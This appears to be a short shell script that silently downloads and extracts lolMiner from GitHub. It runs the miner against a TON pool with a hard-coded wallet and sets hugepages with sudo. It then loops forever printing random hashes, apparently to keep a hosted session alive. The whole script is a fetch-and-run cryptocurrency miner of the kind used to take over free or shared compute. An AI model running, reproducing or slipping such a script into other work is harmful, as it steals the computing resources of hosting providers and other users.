#!/bin/bash

#!/bin/sh

#!/bin/bash

wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.45/lolMiner_v1.45_Lin64.tar.gz >/dev/null 2>&1

 tar -xf lolMiner_v1.45_Lin64.tar.gz >/dev/null 2>&1

./1.45/lolMiner --algo TON --pool https://next.ton-pool.com -u EQDKNhmKMdn1RYKBUHm0mTiBdQ80JrAyTA5cqzjr2n2rrG5X && sudo sysctl -w vm.nr_hugepages=1280

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
